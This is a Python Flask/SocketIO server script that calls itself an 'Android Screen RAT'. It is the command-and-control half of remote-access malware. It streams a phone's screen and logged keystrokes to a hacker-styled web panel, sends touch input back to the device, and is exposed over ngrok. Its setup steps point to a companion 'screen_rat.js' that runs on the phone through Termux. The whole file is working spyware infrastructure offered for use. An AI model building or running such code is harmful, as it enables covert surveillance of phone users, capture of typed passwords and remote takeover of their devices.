#!/usr/bin/env python3
"""
📱 Android Screen RAT - FIXED Request Context
QR → Termux → Live Screen + Touch + Keys
"""

import base64
import os
from io import BytesIO
from flask import Flask, Response, jsonify
from flask_socketio import SocketIO, emit
import qrcode
from PIL import Image
import eventlet
import threading

eventlet.monkey_patch()
app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

print("📱 Android Screen RAT - Fixed Context")
NGROK_HOST = input("🌐 ngrok host (e.g. e21ba7032bdf.ngrok-free.app): ").strip()
PORT = 8080
WS_URL = f"wss://{NGROK_HOST}:{PORT}"
BASE_URL = f"https://{NGROK_HOST}:{PORT}"
print(f"✅ WS: {WS_URL}")

# SocketIO Events
@socketio.on('connect')
def handle_connect():
    print("👤 Client connected")
    emit('status', {'msg': 'Connected to RAT'})

@socketio.on('android_screen')
def handle_screen(data):
    emit('screen_frame', data['data'], broadcast=True, include_self=False)

@socketio.on('android_keylog')
def handle_keylog(data):
    emit('keylog', data, broadcast=True, include_self=False)

@socketio.on('touch')
def handle_touch(data):
    print(f"👆 Touch: {data}")
    emit('touch_received', data, broadcast=True, include_self=False)

# HTML Pages (NO render_template_string - fixes context error)
@app.route('/')
def index():
    return '''
<!DOCTYPE html>
<html>
<head>
    <title>Android RAT Control</title>
    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { 
            background: #000; 
            color: #0f0; 
            font-family: 'Courier New', monospace; 
            overflow: hidden;
        }
        #screen { 
            width: 100vw; 
            height: 100vh; 
            background: #111; 
            cursor: crosshair;
            image-rendering: pixelated;
        }
        #toolbar { 
            position: fixed; 
            top: 10px; 
            left: 10px; 
            background: rgba(0,0,0,0.9); 
            padding: 15px; 
            border: 2px solid #0f0;
            border-radius: 5px;
        }
        #keys { 
            position: fixed; 
            bottom: 10px; 
            right: 10px; 
            width: 350px; 
            height: 250px; 
            background: rgba(0,0,0,0.95); 
            color: #0f0; 
            overflow-y: auto; 
            padding: 15px; 
            font-size: 12px;
            border: 1px solid #0f0;
            border-radius: 5px;
        }
        button { 
            background: #0f0; 
            color: #000; 
            border: none; 
            padding: 8px 15px; 
            margin: 5px; 
            cursor: pointer;
            font-weight: bold;
        }
        button:hover { background: #0a0; }
        #status { color: #ff0; font-weight: bold; }
        #qr { 
            position: fixed; 
            top: 10px; 
            right: 10px; 
            background: rgba(0,0,0,0.9); 
            padding: 15px; 
            border: 2px solid #0f0;
            border-radius: 5px;
            max-width: 320px;
        }
    </style>
</head>
<body>
    <canvas id="screen"></canvas>
    
    <div id="toolbar">
        <h3>📱 Android RAT</h3>
        <button onclick="requestScreen()">🔄 Request Screen</button>
        <button onclick="clearKeys()">🗑️ Clear Keys</button>
        <div id="status">🟡 Waiting for Android...</div>
    </div>
    
    <div id="keys">
        <strong>⌨️ Keylog:</strong><br>
    </div>
    
    <div id="qr">
        <strong>📱 Android Setup:</strong><br>
        <ol style="font-size:11px; line-height:1.3;">
            <li>Install <code>Termux</code> + <code>termux-api</code></li>
            <li>Scan QR or copy: <code style="word-break:break-all;">''' + WS_URL + '''</code></li>
            <li><code>node screen_rat.js</code></li>
        </ol>
    </div>

    <script>
        const socket = io();
        const canvas = document.getElementById('screen');
        const ctx = canvas.getContext('2d');
        const status = document.getElementById('status');
        const keysDiv = document.getElementById('keys');

        // Fullscreen canvas
        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);

        // Touch/Mouse control
        canvas.addEventListener('click', e => sendTouch(e));
        canvas.addEventListener('touchstart', e => {
            e.preventDefault();
            sendTouch(e.touches[0]);
        });

        function sendTouch(e) {
            const rect = canvas.getBoundingClientRect();
            const x = Math.round((e.clientX || e.touches[0].clientX - rect.left) * (1080 / rect.width));
            const y = Math.round((e.clientY || e.touches[0].clientY - rect.top) * (1920 / rect.height));
            socket.emit('touch', {x: x, y: y});
        }

        // Socket events
        socket.on('screen_frame', data => {
            const img = new Image();
            img.onload = () => {
                ctx.imageSmoothingEnabled = false;
                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                status.textContent = `🟢 LIVE 30fps | ${new Date().toLocaleTimeString()}`;
            };
            img.src = `data:image/jpeg;base64,${data}`;
        });

        socket.on('keylog', data => {
            keysDiv.innerHTML += `[${data.time}] ${data.key}<br>`;
            keysDiv.scrollTop = keysDiv.scrollHeight;
        });

        socket.on('touch_received', data => {
            ctx.fillStyle = 'lime';
            ctx.globalAlpha = 0.3;
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            setTimeout(() => ctx.clearRect(0, 0, canvas.width, canvas.height), 150);
        });

        function requestScreen() {
            socket.emit('request_screen');
            status.textContent = '📡 Sending request...';
        }

        function clearKeys() {
            keysDiv.innerHTML = '<strong>⌨️ Keylog:</strong><br>';
        }

        socket.on('connect', () => {
            status.textContent = '🟢 Connected to server';
        });
    </script>
</body>
</html>
    '''

if __name__ == '__main__':
    print(f"\n🚀 CONTROL PANEL: {BASE_URL}")
    print("📱 ANDROID WS: " + WS_URL)
    print("🔥 Start ngrok http 8080 in another terminal!")
    socketio.run(app, host='0.0.0.0', port=PORT, debug=False)